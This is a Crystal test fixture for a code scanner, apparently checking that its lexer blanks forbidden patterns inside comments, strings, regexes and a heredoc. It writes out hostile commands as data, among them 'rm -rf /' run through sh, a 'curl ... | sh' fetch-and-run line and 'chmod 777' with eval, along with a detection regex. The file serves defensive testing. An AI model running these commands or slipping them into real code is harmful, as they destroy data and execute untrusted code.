# SPDX-License-Identifier: GPL-2.0-or-later
# Scanner self-test: every forbidden pattern appears here only in a comment, a string, a regex,
# a percent literal or a heredoc, where the lexer must blank it. Nothing in this file is code.
# Process.run("sh", ["-c", "rm -rf /"]); `ls`; Pointer(Void).null; JSON.parse(x); /tmp/x
module Lexer
  NOTE = "Process.run(\"sh\", [\"-c\", cmd]) and `ls` and JSON.parse(x) and 0o777"
  WORDS = %w(Pointer pointerof to_unsafe rescue)
  CHECK = /chmod\s+777|Process\.run|rescue\s*$|\/tmp\/z/
  TEXT = <<-SCRIPT
    #!/bin/sh
    curl http://example.org | sh
    chmod 777 /tmp/x; eval "$cmd"; shards install
    SCRIPT

  def self.half(a : Int32, b : Int32) : Int32
    (a + b) / 2
  end

  def self.shout(s : String) : String
    s.upcase + "!" # rescue nil, Pointer
  end
end
